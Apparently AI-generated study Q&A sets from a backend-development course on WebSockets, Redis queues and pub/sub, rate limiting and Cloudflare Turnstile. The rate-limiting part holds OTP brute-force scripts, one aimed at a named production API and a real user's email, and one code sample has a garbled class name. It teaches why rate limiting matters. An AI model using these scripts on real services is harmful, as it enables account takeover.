Here are questions and answers based on the content from "Week 19.1" about the fundamentals of backend communication, including WebSockets, polling, their implementation in Node.js and Next.js, and scaling strategies using pub/sub architectures. These cover the key concepts, examples, and diagrams necessary for understanding the topic, with answers sourced directly from the provided content.

---

### Questions and Answers on Backend Communication Fundamentals

**Q1: What is backend communication in the context of modern applications?**  
**A1:** Backend communication refers to the exchange of data and coordination between different backend systems or components within an application's architecture. It is required because modern applications often have complex requirements that cannot be fulfilled by a single, monolithic backend system, relying instead on multiple specialized backend services or microservices.

**Q2: Why is backend communication necessary in application architecture?**  
**A2:** The need for backend communication arises due to:  
1. **Separation of Concerns**: Breaking down an application into smaller, focused services promotes modularity and maintainability.  
2. **Scalability**: Different components can be scaled independently based on their requirements.  
3. **Fault Isolation**: Failure in one component doesn’t necessarily affect the entire system.  
4. **Leveraging Specialized Services**: It enables integration of specialized services like payment gateways or notification systems.

**Q3: What are the key components in the general backend communication architecture diagram?**  
**A3:** The key components are:  
- **Backend Services (BE 1 - BE 7)**: Different backend components or microservices.  
- **Message Queue**: Facilitates asynchronous communication by sending and consuming messages.  
- **Pub Sub**: A publish-subscribe component enabling decoupled communication via topics.

**Q4: How does the communication flow work in the general backend architecture diagram?**  
**A4:**  
1. BE 1 sends messages or tasks to the Message Queue via HTTP.  
2. BE 3 consumes messages from the Message Queue.  
3. BE 2, BE 4, BE 5, BE 6, and BE 7 communicate with the Pub Sub component using WebSockets for real-time, bidirectional communication.  
4. Components publish messages to topics on the Pub Sub, and subscribed components receive them.

---

### Questions and Answers on Example Architectures

**Q5: How does the PayTM transaction flow handle notifications?**  
**A5:**  
1. A transaction (e.g., "Transfer Rs 100 to 7010233311") is stored in the Database.  
2. Messages related to the transaction are added to the Push Notification Queue, Phone Queue, and Email Queue.  
3. Dedicated services (Push Notification Service, Phone Service, Email Service) consume messages from their respective queues and process them asynchronously.

**Q6: What is the submission flow for the LeetCode problem submission architecture?**  
**A6:**  
1. A user submits a problem (e.g., "problem_id: 1, code: 1, status: processing"), stored in the Database.  
2. The submission is added to either the Premium Users Submission Queue or Free Users Submission Queue based on account type.  
3. Big Machines process premium user submissions from their queue, while Small Machines process free user submissions from theirs.

**Q7: How does the LeetCode architecture prioritize premium users?**  
**A7:** It prioritizes premium user submissions by allocating more powerful computing resources (Big Machines) to the Premium Users Submission Queue, while free user submissions are handled by smaller machines from the Free Users Submission Queue.

---

### Questions and Answers on Types of Communication

**Q8: What is synchronous communication, and why is it considered strongly coupled?**  
**A8:** Synchronous communication involves direct, real-time interaction where the sender waits for a response from the receiver before proceeding. It is considered "strongly coupled" because the components are tightly integrated and dependent on each other.

**Q9: What are examples of synchronous communication mechanisms?**  
**A9:**  
1. **HTTP (REST/GraphQL)**: A protocol where the client sends a request and waits for the server’s response.  
2. **WebSocket**: Enables real-time, bidirectional communication, often considered synchronous due to its low-latency, full-duplex nature, though its classification can be debated.

**Q10: What is asynchronous communication, and how does it promote loose coupling?**  
**A10:** Asynchronous communication decouples the sender and receiver, allowing them to operate independently without the sender waiting for a response. This promotes loose coupling, improving system responsiveness and scalability.

**Q11: What are examples of asynchronous communication mechanisms?**  
**A11:**  
1. **Messaging Queues**: Producers send messages to a queue, and consumers process them at their own pace.  
2. **Pub/Sub**: Publishers send messages to topics, and subscribers receive them without direct connection.  
3. **Server-Sent Events (SSE)**: Servers push data to clients asynchronously over a long-lived connection.  
4. **WebSocket**: Can be used asynchronously for real-time data exchange without constant polling.

---

### Questions and Answers on WebSockets

**Q12: What are WebSockets, and how do they function?**  
**A12:** WebSockets establish a persistent, full-duplex communication channel over a single TCP connection between the client and server, allowing real-time, bidirectional communication where the server can push data without constant client polling.

**Q13: What are some use cases for WebSockets?**  
**A13:**  
1. **Real-Time Applications**: Chat apps, live sports updates, real-time gaming (e.g., Binance trading platform).  
2. **Live Feeds**: Financial tickers, news feeds, social media updates.  
3. **Interactive Services**: Collaborative editing tools, live customer support chat, interactive webinars.

**Q14: Why is HTTP/REST less suitable than WebSockets for real-time communication?**  
**A14:**  
1. **Network Handshake**: HTTP requires a new handshake for each request, adding latency and overhead.  
2. **Server Push**: HTTP cannot push data to the client without a request, requiring inefficient polling for updates.

**Q15: How does polling differ from WebSockets in retrieving data like "SOL price"?**  
**A15:** Polling involves the browser repeatedly sending requests to the server, even if data hasn’t changed, leading to unnecessary traffic and delays. WebSockets establish a persistent connection, allowing the server to push updates instantly when data changes.

**Q16: Why does LeetCode use polling instead of WebSockets for problem submissions?**  
**A16:** LeetCode uses polling because the submission process does not require instant updates, and the server can respond with the final result once processing is complete, making polling suitable for this use case.

---

### Questions and Answers on WebSocket Implementation in Node.js

**Q17: What are the commonly used WebSocket libraries in Node.js?**  
**A17:**  
1. **ws**: A lightweight, high-performance library with a simple API and good cross-platform support.  
2. **websocket**: Offers additional features like multiplexing and ping/pong handling.  
3. **Socket.IO**: Provides advanced features like reconnection and rooms but is harder to support across platforms.

**Q18: Why is the `ws` library recommended over Socket.IO?**  
**A18:** The `ws` library is recommended for its simplicity, lightweight nature, and better cross-platform support (e.g., Android, iOS, Rust), avoiding the overhead of Socket.IO’s additional features like rooms.

**Q19: How do you create a basic WebSocket server using the `ws` library in Node.js?**  
**A19:**  
```jsx
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });
wss.on('connection', (ws) => {
  console.log('New client connected');
  ws.on('message', (data) => {
    console.log(`Received message: ${data}`);
    wss.clients.forEach((client) => {
      if (client !== ws && client.readyState === WebSocket.OPEN) {
        client.send(data);
      }
    });
  });
  ws.on('close', () => {
    console.log('Client disconnected');
  });
});
```

**Q20: How do you implement a WebSocket server with the `http` module in Node.js using TypeScript?**  
**A20:**  
1. Initialize a project (`npm init -y`).  
2. Set up TypeScript (`npx tsc --init`) with `"rootDir": "./src", "outDir": "./dist"`.  
3. Install dependencies (`npm install ws @types/ws`).  
4. Use this code:  
```tsx
import WebSocket, { WebSocketServer } from 'ws';
import http from 'http';
const server = http.createServer((request, response) => {
  console.log(`${new Date()} Received request for ${request.url}`);
  response.end("Hi there");
});
const wss = new WebSocketxadServer({ server });
wss.on('connection', (ws) => {
  ws.on('error', console.error);
  ws.on('message', (data, isBinary) => {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(data, { binary: isBinary });
      }
    });
  });
  ws.send('Hello! Message From Server!!');
});
server.listen(8080, () => {
  console.log(`${new Date()} Server is listening on port 8080`);
});
```

**Q21: How do you implement a WebSocket server with Express.js in Node.js?**  
**A21:**  
1. Install additional dependencies (`npm install express @types/express`).  
2. Use this code:  
```tsx
import express from 'express';
import { WebSocketServer } from 'ws';
const app = express();
const httpServer = app.listen(8080);
const wss = new WebSocketServer({ server: httpServer });
wss.on('connection', (ws) => {
  ws.on('error', console.error);
  ws.on('message', (data, isBinary) => {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(data, { binary: isBinary });
      }
    });
  });
  ws.send('Hello! Message From Server!!');
});
```

---

### Questions and Answers on Client-Side WebSocket Handling

**Q22: How does the `useSocket` hook manage WebSocket connections in React?**  
**A22:**  
```jsx
import { useEffect, useState } from 'react';
const useSocket = (url: string) => {
  const [socket, setSocket] = useState<WebSocket | null>(null);
  useEffect(() => {
    const newSocket = new WebSocket(url);
    newSocket.onopen = () => { console.log('Connection established'); };
    newSocket.onmessage = (message) => { console.log('Message received:', message.data); };
    newSocket.onerror = (error) => { console.error('WebSocket error:', error); };
    newSocket.onclose = () => { console.log('WebSocket connection closed'); };
    setSocket(newSocket);
    return () => { newSocket.close(); };
  }, [url]);
  const sendMessage = (message: string) => {
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(message);
    } else {
      console.error('WebSocket is not connected');
    }
  };
  return { socket, sendMessage };
};
export default useSocket;
```

**Q23: How do you use the `useSocket` hook in a React component?**  
**A23:**  
```jsx
import React from 'react';
import useSocket from './useSocket';
const App = () => {
  const { socket, sendMessage } = useSocket('ws://localhost:8080');
  const handleSendMessage = () => {
    sendMessage('Hello Server!');
  };
  return (
    <div>
      <button onClick={handleSendMessage}>Send Message</button>
    </div>
  );
};
export default App;
```

---

### Questions and Answers on Next.js WebSocket Implementation

**Q24: How do you set up a WebSocket connection in a Next.js client component?**  
**A24:**  
1. Create a project (`npx create-next-app my-websocket-app`).  
2. Update `app/page.tsx` with `"use client"` and this code:  
```tsx
"use client"
import { useEffect, useState } from 'react';
export default function HomePage() {
  const [socket, setSocket] = useState<WebSocket | null>(null);
  useEffect(() => {
    const newSocket = new WebSocket('ws://localhost:8080');
    newSocket.onopen = () => {
      console.log('Connection established');
      newSocket.send('Hello Server!');
    };
    newSocket.onmessage = (message) => {
      console.log('Message received:', message.data);
    };
    setSocket(newSocket);
    return () => newSocket.close();
  }, []);
  return (<>hi there</>);
}
```

---

### Questions and Answers on Scaling WebSocket Servers

**Q25: What are the key points for scaling WebSocket servers?**  
**A25:**  
1. **Multiple WebSocket Servers**: Deploy a fleet or cluster of servers for load distribution.  
2. **Central Orchestration Layer**: Use a pub/sub system or load balancer to manage communication.  
3. **Stateless WebSocket Servers**: Keep servers stateless for easy scaling without complex state management.

**Q26: How does a pub/sub architecture scale WebSocket servers?**  
**A26:**  
1. **WebSocket Servers (ws1, ws2, ws3)**: Individual instances in the fleet.  
2. **Pub Sub Component**: A central message broker for routing messages.  
3. **Communication Flow**:  
   - Servers connect to the Pub Sub component via WebSockets.  
   - A server subscribes to a topic on the Pub Sub.  
   - A message is published to the topic by one server.  
   - The Pub Sub distributes it to all subscribed servers, which relay it to their clients.

---

### Verification of Coverage
This set of 26 questions and answers addresses all major sections: general backend communication, example architectures (PayTM, LeetCode), types of communication, WebSockets (use cases, polling comparison, implementation in Node.js and Next.js), client-side handling, and scaling with pub/sub. All diagrams, code examples, and key points from the content are reflected. If you need further clarification on any specific part, let me know!

Here are questions and answers based on the "Week 19.2" lecture content about queues, publish-subscribe (pub/sub) systems, and Redis in the context of a LeetCode-like architecture, including their practical implementation in Node.js. These cover the essential concepts, vulnerabilities, architecture diagrams, Redis functionalities, and code examples necessary for understanding the topic, with answers sourced directly from the provided content.

---

### Questions and Answers on Queues, Pub/Sub, and Redis Overview

**Q1: What are the roles of queues, pub/sub systems, and Redis in a LeetCode-like architecture?**  
**A1:** Queues handle asynchronous task processing (e.g., user submissions), pub/sub systems enable real-time communication and event-driven features (e.g., live updates), and Redis serves as a database, cache, and message broker for caching data, queuing tasks, and facilitating pub/sub communication.

**Q2: What vulnerabilities arise from running user code directly on the primary backend server?**  
**A2:**  
1. **Infinite Loops**: Code like `while(1)` can consume excessive resources, degrading performance or crashing the system.  
2. **System Commands**: Malicious code like `system("ls")` could compromise server integrity or expose data.  
3. **Resource Exhaustion**: Inefficient code can overuse memory or CPU, impacting stability.  
4. **Denial of Service (DoS)**: Resource-intensive tasks could render the server unresponsive.

**Q3: How can the risks of running user code on the primary backend be mitigated?**  
**A3:** Isolate and delegate user code execution to separate worker processes or containers, ensuring the primary backend remains secure and unaffected by vulnerabilities.

---

### Questions and Answers on Queues

**Q4: What are the benefits of using queues in a LeetCode-like platform?**  
**A4:**  
1. **Load Balancing**: Distributes workload across worker nodes, preventing overload on the primary backend.  
2. **Scalability**: Additional worker nodes can be added to handle increased submissions.  
3. **Fault Tolerance**: Failed tasks can be retried or processed by other workers.  
4. **Asynchronous Processing**: Submissions are acknowledged immediately, keeping the backend responsive while execution occurs asynchronously.

**Q5: How does the queue architecture work in the provided diagram?**  
**A5:** The "Primary Backend" receives user submissions (e.g., `problem_id: 1`, `code: "java"`) and adds them to a queue. Worker nodes (`W1`, `W2`) consume tasks from the queue, execute the code in isolated environments, and report results back to the primary backend or other components.

---

### Questions and Answers on Pub/Sub

**Q6: What is the purpose of a pub/sub system in a LeetCode-like platform?**  
**A6:** Pub/sub systems enable real-time communication and event-driven architectures, supporting features like live coding sessions, collaborative coding, or real-time updates on submission statuses by decoupling publishers and subscribers.

**Q7: How does the pub/sub architecture function in the provided diagram?**  
**A7:** The "pub/sub" component handles the publication and subscription of events (e.g., "user 1 problem: 2 status: TLE"). The "websocket" component facilitates real-time communication between the browser and backend, delivering updates like submission statuses.

---

### Questions and Answers on Redis Basics

**Q8: What are the main uses of Redis in a LeetCode-like platform?**  
**A8:**  
1. **Caching**: Stores frequently accessed data (e.g., problem descriptions, test cases) for faster response times.  
2. **Pub/Sub**: Facilitates real-time communication between components.  
3. **Queuing**: Acts as a lightweight message queue for asynchronous task processing.  
4. **Leaderboards and Ranking**: Uses sorted sets for real-time leaderboards.  
5. **Session Management**: Manages user sessions across servers.

**Q9: Why is Redis considered an in-memory data structure store?**  
**A9:** Redis stores all data in memory, enabling fast read and write operations, unlike traditional databases that rely heavily on disk storage, though it also provides persistence mechanisms.

**Q10: What are the two persistence options in Redis, and how do they work?**  
**A10:**  
1. **RDB (Redis Database File)**: Performs point-in-time snapshots of the dataset at intervals (e.g., `save 900 1` saves every 900 seconds if 1 key changes), creating a compact file.  
2. **AOF (Append Only File)**: Logs every write operation to a file, which can be replayed on startup to reconstruct the dataset, offering higher durability.

---

### Questions and Answers on Final Architecture

**Q11: How does the final architecture combine queues, pub/sub, and Redis?**  
**A11:** The "Browser" sends submissions to the "Primary Backend," which adds them to a queue or Redis. Worker nodes (`W1`, `W2`) consume tasks, execute code in isolation, and report results. The "pub/sub" component (possibly Redis) handles real-time events, and the "websocket" delivers updates to the browser.

**Q12: What benefits does the final architecture provide?**  
**A12:**  
1. **Scalability**: More worker nodes or pub/sub instances can be added.  
2. **Isolation**: User code runs separately, protecting the primary backend.  
3. **Real-time Communication**: Pub/sub and websockets enable live updates.  
4. **Caching and Performance**: Redis caching improves response times.  
5. **Fault Tolerance**: Failed tasks can be retried by other workers.

---

### Questions and Answers on Starting Redis Locally

**Q13: How do you start a Redis instance locally using Docker?**  
**A13:**  
1. Start the container: `docker run --name my-redis -d -p 6379:6379 redis`.  
2. Connect to the container: `docker exec -it my-redis /bin/bash`.  
3. Access the Redis CLI: `redis-cli`.

---

### Questions and Answers on Redis as a Database

**Q14: What are the basic Redis commands for key-value operations?**  
**A14:**  
- **SET**: `SET mykey "Hello"` sets a value to a key.  
- **GET**: `GET mykey` retrieves the value of a key.  
- **DEL**: `DEL mykey` deletes a key-value pair.

**Q15: How do you use Redis hashes for storing multiple fields under a key?**  
**A15:**  
- `HSET user:100 name "John Doe" email "user@example.com" age "30"` sets fields under "user:100".  
- `HGET user:100 name` retrieves the "name" field.  
- `HGET user:100 email` retrieves the "email" field.

**Q16: Why should Redis not be used as a primary database?**  
**A16:** Due to its in-memory nature, Redis risks data loss in case of system failures or restarts, making it better suited as a cache or for transient data rather than a primary database.

---

### Questions and Answers on Redis as a Queue

**Q17: How does Redis function as a queue in a LeetCode-like system?**  
**A17:** The "Primary Backend" pushes submissions (e.g., `problem_id: 1`, `code: "java"`) to a Redis queue using `LPUSH`. Worker nodes (`W1`, `W2`) pop tasks using `RPOP` or `BRPOP`, execute the code, and report results.

**Q18: What Redis commands are used for queue operations?**  
**A18:**  
- **Pushing**: `LPUSH problems 1` adds items to the left of the "problems" list.  
- **Popping**: `RPOP problems` removes and returns items from the right.  
- **Blocked Pop**: `BRPOP problems 0` waits indefinitely for items; `BRPOP problems 30` waits up to 30 seconds.

---

### Questions and Answers on Talking to Redis via Node.js

**Q19: How does the Express server in Node.js interact with Redis for submissions?**  
**A19:**  
```tsx
import express from "express";
import { createClient } from "redis";
const app = express();
app.use(express.json());
const client = createClient();
app.post("/submit", async (req, res) => {
    const problemId = req.body.problemId;
    const code = req.body.code;
    const language = req.body.language;
    await client.lPush("problems", JSON.stringify({ code, language, problemId }));
    res.status(200).send("Submission received and stored.");
});
async function startServer() {
    await client.connect();
    app.listen(3000, () => { console.log("Server is running on port 3000"); });
}
startServer();
```
It receives submissions via POST to `/submit`, pushes them to the "problems" list in Redis with `lPush`, and responds to the client.

**Q20: How does the worker service in Node.js process submissions from Redis?**  
**A20:**  
```tsx
import { createClient } from "redis";
const client = createClient();
async function processSubmission(submission: string) {
    const { problemId, code, language } = JSON.parse(submission);
    console.log(`Processing submission for problemId ${problemId}...`);
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log(`Finished processing submission for problemId ${problemId}.`);
}
async function startWorker() {
    await client.connect();
    while (true) {
        const submission = await client.brPop("problems", 0);
        // @ts-ignore
        await processSubmission(submission.element);
    }
}
startWorker();
```
It uses `brPop` to wait for submissions from the "problems" list, processes them with a simulated delay, and logs the progress.

---

### Questions and Answers on Pub/Sub Deep Dive

**Q21: What is the pub/sub messaging pattern, and how does it benefit a LeetCode-like system?**  
**A21:** Pub/sub is a pattern where publishers send messages to topics without knowing the subscribers, and subscribers listen to topics without knowing the publishers. It benefits a LeetCode-like system by enabling real-time, decoupled communication for features like live updates or collaborative coding.

**Q22: How do you subscribe to and publish messages in Redis pub/sub?**  
**A22:**  
- **Subscribe**: `SUBSCRIBE problems_done` listens for messages on the "problems_done" topic.  
- **Publish**: `PUBLISH problems_done "{id: 1, ans: 'TLE'}"` sends a message to the "problems_done" topic.

---

### Questions and Answers on Pub/Sub in Node.js

**Q23: How does the updated worker service use Redis pub/sub in Node.js?**  
**A23:**  
```tsx
import { createClient } from "redis";
const client = createClient();
async function processSubmission(submission: string) {
    const { problemId, code, language } = JSON.parse(submission);
    console.log(`Processing submission for problemId ${problemId}...`);
    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log(`Finished processing submission for problemId ${problemId}.`);
    client.publish("problem_done", JSON.stringify({ problemId, status: "TLE" }));
}
async function startWorker() {
    await client.connect();
    while (true) {
        const submission = await client.brPop("problems", 0);
        // @ts-ignore
        await processSubmission(submission.element);
    }
}
startWorker();
```
It publishes the submission status (e.g., "TLE") to the "problem_done" channel using `client.publish` after processing.

**Q24: How can you test Redis pub/sub subscriptions using redis-cli?**  
**A24:** Run `SUBSCRIBE problem_done` in redis-cli to listen to the "problem_done" channel. When the worker publishes a message (e.g., `{"problemId":1,"status":"TLE"}`), it appears in the cli output.

---

### Verification of Coverage
This set of 24 questions and answers addresses all key sections: vulnerabilities, queues, pub/sub, Redis (as a database, queue, and pub/sub), final architecture, and Node.js implementations. All diagrams, code snippets, and concepts from the content are reflected. If you need further details on any specific part, let me know!

Here are questions and answers based on the "Week 21.1" lecture content about rate limiting, its importance, implementation, vulnerabilities, and enhancements like CAPTCHAs and DDoS protection using Cloudflare. These are designed to build a strong conceptual understanding of the topic, with answers sourced directly from the provided content.

---

### Questions and Answers on Rate Limiting Basics

**Q1: What is rate limiting, and what are its primary purposes in web applications?**  
**A1:** Rate limiting is a technique to control the rate at which requests are processed in web applications and APIs. Its primary purposes are:  
1. **Preventing Overload**: Limits resource overuse to keep the system responsive.  
2. **Mitigating Abuse**: Reduces susceptibility to brute-force attacks and spamming.  
3. **Managing Traffic**: Regulates request flow in high-traffic scenarios.  
4. **DDoS Protection**: Limits requests per source to filter malicious traffic.  
5. **Cost Optimization**: Prevents excessive resource consumption in cloud environments.

**Q2: How does rate limiting protect against abuse like brute-force attacks?**  
**A2:** By limiting how often someone can perform an action (e.g., login attempts), rate limiting reduces the feasibility of brute-force attacks, where attackers try numerous combinations, thus maintaining system integrity.

**Q3: Why is rate limiting important for managing high-traffic scenarios?**  
**A3:** In high-traffic scenarios like ticket sales, rate limiting manages server load, prevents crashes, and ensures fair resource distribution (e.g., bandwidth) by regulating request flow and preventing any single client from monopolizing resources.

**Q4: How does rate limiting contribute to DDoS protection?**  
**A4:** Rate limiting is part of a DDoS protection strategy by restricting the number of requests from a single source or IP address, helping detect and filter out malicious traffic to keep the service operational during an attack.

---

### Questions and Answers on Applying Rate Limiting

**Q5: Why is rate limiting critical for password reset endpoints?**  
**A5:** Password reset endpoints should be heavily rate limited because without it, attackers can brute-force OTPs by sending numerous requests, potentially gaining unauthorized access to user accounts.

**Q6: Which endpoints require rate limiting, and for what reasons?**  
**A6:**  
1. **Password Reset Endpoints**: Prevent OTP brute-forcing.  
2. **Login Endpoints**: Stop credential brute-force attacks.  
3. **Sign-up/Registration Endpoints**: Prevent automated fake account creation.  
4. **API Endpoints**: Avoid excessive usage and DDoS attacks.  
5. **Sensitive Operations**: Protect actions like email/password changes from abuse.  
6. **High-Traffic Endpoints**: Manage load and ensure fairness (e.g., ticket purchases).

**Q7: What factors should be considered when applying rate limits?**  
**A7:** Rate limiting should be based on factors like IP address, user ID, or email address, depending on the application’s needs, with limits set to allow legitimate usage while preventing abuse or excessive load.

---

### Questions and Answers on Implementing a Simple Reset Password Endpoint

**Q8: How do you set up a TypeScript project for a basic password reset server?**  
**A8:**  
1. Initialize with `npm init -y` and `npx tsc --init`.  
2. Update `tsconfig.json` with `"rootDir": "./src", "outDir": "./dist"`.  
3. Install dependencies: `npm i express @types/express`.

**Q9: What is the functionality of the initial password reset endpoint code?**  
**A9:**  
```tsx
import express from 'express';
const app = express();
const PORT = 3000;
app.use(express.json());
const otpStore: Record<string, string> = {};
app.post('/generate-otp', (req, res) => {
  const email = req.body.email;
  if (!email) return res.status(400).json({ message: "Email is required" });
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = otp;
  console.log(`OTP for ${email}: ${otp}`);
  res.status(200).json({ message: "OTP generated and logged" });
});
app.post('/reset-password', (req, res) => {
  const { email, otp, newPassword } = req.body;
  if (!email || !otp || !newPassword) return res.status(400).json({ message: "Email, OTP, and new password are required" });
  if (otpStore[email] === otp) {
    console.log(`Password for ${email} has been reset to: ${newPassword}`);
    delete otpStore[email];
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});
app.listen(PORT, () => console.log(`Server running on <http://localhost>:${PORT}`));
```
It generates a 6-digit OTP for an email, stores it in `otpStore`, logs it, and resets the password if the OTP matches, clearing the OTP afterward.

**Q10: How can you test the password reset endpoints using Postman?**  
**A10:**  
1. Start the server with `npx ts-node src/index.ts`.  
2. Send a POST to `http://localhost:3000/generate-otp` with `{"email": "example@example.com"}`.  
3. Copy the OTP from the console.  
4. Send a POST to `http://localhost:3000/reset-password` with `{"email": "example@example.com", "otp": "123456", "newPassword": "newpassword"}` (replace "123456" with the logged OTP).  
5. Without rate limiting, you can keep sending requests to guess the OTP.

---

### Questions and Answers on Exploiting the Endpoint

**Q11: How can the lack of rate limiting be exploited on the `/reset-password` endpoint?**  
**A11:** An attacker can send numerous requests to guess the OTP, as shown in this script:  
```tsx
import axios from "axios";
async function sendRequest(otp: number) {
  let data = JSON.stringify({"email": "harkirat@gmail.com", "otp": otp, "newPassword": "123123123"});
  let config = { method: 'post', url: '<http://localhost:3000/reset-password>', headers: {...}, data };
  try { await axios.request(config); console.log("done for " + otp); } catch(e) {}
}
async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) promises.push(sendRequest(i + j));
    await Promise.all(promises);
  }
}
main();
```
It sends 1,000,000 requests in batches of 100, trying OTPs from 0 to 999,999.

**Q12: What vulnerability does the initial endpoint implementation expose?**  
**A12:** Without rate limiting, an attacker can brute-force the OTP by sending a large number of requests until they find the correct one, potentially gaining unauthorized access to user accounts.

---

### Questions and Answers on Exploiting in Production

**Q13: How can you exploit a production endpoint like `harkirat.classx.co.in` without rate limiting?**  
**A13:**  
1. Visit `https://harkirat.classx.co.in`, enter an email (e.g., `randomuser@example.com`), and request an OTP.  
2. Copy the OTP verification request as a cURL from the Network tab.  
3. Use this script:  
```tsx
import axios from "axios";
async function sendRequest(otp: number) {
  let config = { method: 'get', url: '<https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=>' + otp, headers: {...} };
  try { await axios.request(config); } catch (error) { console.error(error); }
}
async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) promises.push(sendRequest(i + j));
    await Promise.all(promises);
  }
}
main();
```
It tries OTPs from 0 to 999,999 until rate limiting kicks in.

**Q14: What happens when you run the exploit script against a production server?**  
**A14:** After a certain number of requests, the server starts rate limiting, preventing further brute-forcing of the OTP, indicating that rate limiting is implemented to protect against such attacks.

---

### Questions and Answers on Saving the Endpoint with Rate Limiting

**Q15: How do you implement rate limiting on the password reset endpoints?**  
**A15:** Install `express-rate-limit` with `npm i express-rate-limit` and update the code:  
```tsx
import express from 'express';
import rateLimit from 'express-rate-limit';
const app = express();
app.use(express.json());
const otpLimiter = rateLimit({ windowMs: 5 * 60 * 1000, max: 3, message: 'Too many requests, please try again after 5 minutes', standardHeaders: true, legacyHeaders: false });
const passwordResetLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5, message: 'Too many password reset attempts, please try again after 15 minutes', standardHeaders: true, legacyHeaders: false });
const otpStore: Record<string, string> = {};
app.post('/generate-otp', otpLimiter, (req, res) => {...});
app.post('/reset-password', passwordResetLimiter, (req, res) => {...});
app.listen(3000, () => console.log(`Server running on <http://localhost>:3000`));
```
It limits OTP generation to 3 requests per 5 minutes and password resets to 5 requests per 15 minutes per IP.

**Q16: What does rate limiting achieve in this implementation?**  
**A16:** It reduces the risk of brute-force attacks and abuse by limiting requests per IP, returning a `429 Too Many Requests` response when limits are exceeded, enhancing security and reliability.

---

### Questions and Answers on Issues with Rate Limiting

**Q17: Why doesn’t rate limiting fully protect against DDoS attacks?**  
**A17:** DDoS attacks overwhelm the system with traffic from multiple sources, saturating bandwidth or consuming resources, which rate limiting alone can’t prevent, as it only limits requests per source, not the total volume.

**Q18: What are the motives behind DDoS attacks?**  
**A18:**  
1. **Extortion and Ransom**: Demand payment to stop the attack.  
2. **Competitive Advantage**: Disrupt access (e.g., sneaker drops) to benefit attackers.  
3. **Ideological/Political Motives**: Disrupt services for ideological reasons.

**Q19: How can you protect the password reset endpoint from DDoS attacks beyond rate limiting?**  
**A19:**  
1. **Limited Password Resets**: Allow only 3 resets per email in 24 hours.  
2. **Captcha Logic**: Distinguish humans from bots.  
3. **DDoS Mitigation Services**: Use CDNs/cloud providers to filter traffic.  
4. **Monitoring**: Detect and respond to attacks quickly.

---

### Questions and Answers on CAPTCHAs

**Q20: What is the purpose of CAPTCHAs, and why are they needed alongside rate limiting?**  
**A20:** CAPTCHAs ensure requests come from humans, not bots, by presenting challenges easy for humans but hard for machines. They’re needed with rate limiting because rate limiting doesn’t stop distributed attacks or sophisticated bots that rotate IPs or mimic humans.

**Q21: What is Cloudflare Turnstile, and how does it differ from traditional CAPTCHAs?**  
**A21:** Cloudflare Turnstile is a free CAPTCHA alternative that provides a frustration-free experience, stopping bots with in-browser tests and proof-of-work/space checks, without the privacy concerns or poor user experience of traditional CAPTCHAs.

---

### Questions and Answers on Adding Cloudflare Turnstile

**Q22: How do you integrate Cloudflare Turnstile into a React frontend?**  
**A22:**  
1. Install `@marsidev/react-turnstile` with `npm install @marsidev/react-turnstile`.  
2. Update `App.tsx`:  
```jsx
import { Turnstile } from '@marsidev/react-turnstile';
import axios from 'axios';
import { useState } from 'react';
function App() {
  const [token, setToken] = useState<string>("");
  return (
    <>
      <input placeholder='OTP'></input>
      <input placeholder='New password'></input>
      <Turnstile onSuccess={(token) => setToken(token)} siteKey='0x4AAAAAAAXtEe2JIeAEUcjX' />
      <button onClick={() => axios.post("<http://localhost:3000/reset-password>", { email: "harkirat@gmail.com", otp: "123456", token })}>Update password</button>
    </>
  );
}
export default App;
```
It renders a Turnstile widget and sends the token with the reset request.

**Q23: How do you verify Turnstile tokens in the backend?**  
**A23:** Update the backend:  
```tsx
import express from 'express';
import cors from "cors";
const SECRET_KEY = "your_site_secret";
const app = express();
app.use(express.json());
app.use(cors());
const otpStore: Record<string, string> = {};
app.post('/reset-password', async (req, res) => {
  const { email, otp, newPassword, token } = req.body;
  let formData = new FormData();
  formData.append('secret', SECRET_KEY);
  formData.append('response', token);
  const result = await fetch('<https://challenges.cloudflare.com/turnstile/v0/siteverify>', { body: formData, method: 'POST' });
  const challengeSucceeded = (await result.json()).success;
  if (!challengeSucceeded) return res.status(403).json({ message: "Invalid reCAPTCHA token" });
  if (!email || !otp || !newPassword) return res.status(400).json({ message: "Email, OTP, and new password are required" });
  if (Number(otpStore[email]) === Number(otp)) {
    console.log(`Password for ${email} has been reset to: ${newPassword}`);
    delete otpStore[email];
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});
app.listen(3000);
```
It verifies the token with Cloudflare before processing the reset.

---

### Questions and Answers on DDoS Protection in Production

**Q24: How do you use Cloudflare for DDoS protection in production?**  
**A24:**  
1. **Move Domain to Cloudflare**: Sign up and add your domain.  
2. **Proxy Records**: In DNS settings, proxy all records (A, AAAA, CNAME) through Cloudflare to route traffic via its network, which filters DDoS attacks.

---

### Verification of Coverage
These 24 questions and answers cover rate limiting fundamentals, application scenarios, implementation, exploitation, mitigation with `express-rate-limit`, limitations against DDoS, CAPTCHAs via Cloudflare Turnstile, and production DDoS protection. All code, diagrams, and key points from the content are reflected. Let me know if you need further clarification!

Here are questions and answers based on the "Week 21.2" lecture content about stateful vs. stateless backends, the singleton pattern, and the publish-subscribe (pub/sub) pattern with its implementation using a singleton. These are designed to build a strong conceptual understanding of the topics, with answers sourced directly from the provided content.

---

### Questions and Answers on Stateful vs. Stateless Backends

**Q1: What is the key difference between stateful and stateless servers?**  
**A1:** Stateless servers do not hold any state in memory and rely on external storage like a database, while stateful servers maintain state within the server’s memory using in-memory variables.

**Q2: What are the advantages of stateless servers?**  
**A2:**  
1. **No Need for Stickiness**: Users can connect to any server, simplifying load balancing.  
2. **Easy Autoscaling**: They scale up or down based on CPU usage, as traffic can be routed to any server.

